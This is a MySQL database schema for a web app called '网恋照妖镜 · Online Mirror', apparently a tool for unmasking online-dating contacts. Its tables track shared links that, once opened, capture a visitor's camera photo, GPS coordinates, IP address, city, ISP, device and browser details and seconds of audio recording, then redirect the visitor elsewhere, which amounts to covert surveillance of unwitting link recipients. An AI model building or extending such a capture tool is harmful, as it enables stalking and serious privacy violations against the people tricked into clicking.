-- ============================================
-- 🪞 网恋照妖镜 · Online Mirror 数据库结构
-- 版本：v2.0
-- 引擎：InnoDB
-- 编码：utf8mb4
-- ============================================

-- 创建数据库（如尚未创建）
CREATE DATABASE IF NOT EXISTS `mirror`
  CHARACTER SET utf8mb4
  COLLATE utf8mb4_unicode_ci;

USE `mirror`;

-- ============================================
-- 1. 用户表
-- ============================================
CREATE TABLE IF NOT EXISTS `mir_users` (
    `id`         INT AUTO_INCREMENT PRIMARY KEY,
    `username`   VARCHAR(50)  NOT NULL UNIQUE,
    `password`   VARCHAR(255) NOT NULL,
    `role`       ENUM('admin','user') DEFAULT 'admin',
    `created_at` TIMESTAMP    DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- ============================================
-- 2. 链接表
-- ============================================
CREATE TABLE IF NOT EXISTS `mir_links` (
    `id`           INT AUTO_INCREMENT PRIMARY KEY,
    `link_id`      VARCHAR(50)   NOT NULL UNIQUE COMMENT '链接唯一标识（6位随机字符）',
    `redirect_url` VARCHAR(1000) NOT NULL        COMMENT '拍照后跳转地址',
    `user_id`      INT           DEFAULT NULL    COMMENT '创建者用户ID',
    `tags`         VARCHAR(500)  DEFAULT NULL    COMMENT '标签（逗号分隔）',
    `status`       ENUM('active','disabled','expired') DEFAULT 'active',
    `created_at`   TIMESTAMP     DEFAULT CURRENT_TIMESTAMP,
    `expires_at`   DATETIME      DEFAULT NULL    COMMENT '过期时间',
    `views`        INT           DEFAULT 0       COMMENT '访问次数',
    `captures`     INT           DEFAULT 0       COMMENT '拍照次数',
    INDEX `idx_link_id` (`link_id`),
    INDEX `idx_status` (`status`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- ============================================
-- 3. 照片表
-- ============================================
CREATE TABLE IF NOT EXISTS `mir_photos` (
    `id`               INT AUTO_INCREMENT PRIMARY KEY,
    `link_id`          VARCHAR(50)   NOT NULL     COMMENT '所属链接ID',
    `file_path`        VARCHAR(500)  NOT NULL     COMMENT '图片文件路径',
    `ip_address`       VARCHAR(45)   DEFAULT NULL COMMENT '拍照者IP',
    `lat`              DECIMAL(10,7) DEFAULT NULL COMMENT 'GPS纬度',
    `lng`              DECIMAL(10,7) DEFAULT NULL COMMENT 'GPS经度',
    `screen_resolution` VARCHAR(30)  DEFAULT NULL COMMENT '屏幕分辨率',
    `os`               VARCHAR(50)   DEFAULT NULL COMMENT '操作系统',
    `browser`          VARCHAR(100)  DEFAULT NULL COMMENT '浏览器及版本',
    `browser_lang`     VARCHAR(20)   DEFAULT NULL COMMENT '浏览器语言',
    `recording_seconds` INT           DEFAULT NULL COMMENT '录音秒数',
    `city`             VARCHAR(100)  DEFAULT NULL COMMENT 'IP城市归属地',
    `isp`              VARCHAR(100)  DEFAULT NULL COMMENT '运营商',
    `user_agent`       TEXT          DEFAULT NULL COMMENT '浏览器UA',
    `file_size`        INT           DEFAULT NULL COMMENT '文件大小（字节）',
    `created_at`       TIMESTAMP     DEFAULT CURRENT_TIMESTAMP COMMENT '拍摄时间',
    INDEX `idx_link_id` (`link_id`),
    INDEX `idx_created_at` (`created_at`),
    CONSTRAINT `fk_photos_link` FOREIGN KEY (`link_id`) REFERENCES `mir_links`(`link_id`) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- ============================================
-- 4. 日志表
-- ============================================
CREATE TABLE IF NOT EXISTS `mir_logs` (
    `id`         INT AUTO_INCREMENT PRIMARY KEY,
    `link_id`    VARCHAR(50)  DEFAULT NULL COMMENT '相关链接ID',
    `action`     VARCHAR(50)  NOT NULL     COMMENT '操作类型',
    `ip_address` VARCHAR(45)  DEFAULT NULL COMMENT '访客IP',
    `user_agent` TEXT         DEFAULT NULL COMMENT '访客UA',
    `created_at` TIMESTAMP    DEFAULT CURRENT_TIMESTAMP,
    INDEX `idx_action` (`action`),
    INDEX `idx_ip` (`ip_address`),
    INDEX `idx_created` (`created_at`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- ============================================
-- 5. 封禁IP表（v2.0 新增）
-- ============================================
CREATE TABLE IF NOT EXISTS `mir_banned_ips` (
    `id`         INT AUTO_INCREMENT PRIMARY KEY,
    `ip_address` VARCHAR(45)  NOT NULL UNIQUE COMMENT '被封禁的IP',
    `reason`     VARCHAR(255) DEFAULT NULL    COMMENT '封禁原因',
    `banned_by`  VARCHAR(50)  DEFAULT 'system' COMMENT '封禁方式 system|admin',
    `created_at` TIMESTAMP    DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- ============================================
-- 6. 系统设置表（v2.0 新增）
-- ============================================
CREATE TABLE IF NOT EXISTS `mir_settings` (
    `id`         INT AUTO_INCREMENT PRIMARY KEY,
    `key`        VARCHAR(100) NOT NULL UNIQUE COMMENT '设置键名',
    `value`      TEXT         DEFAULT NULL    COMMENT '设置值',
    `updated_at` TIMESTAMP    DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- ============================================
-- 外键关系说明（无需执行，仅参考）
-- ============================================
-- users (id) ──→ links (user_id)
-- links (link_id) ──→ photos (link_id) [ON DELETE CASCADE]
-- ============================================
-- 安装完成！
-- 导入后请访问 install.php 或手动在 config.php 中填写数据库信息
-- ============================================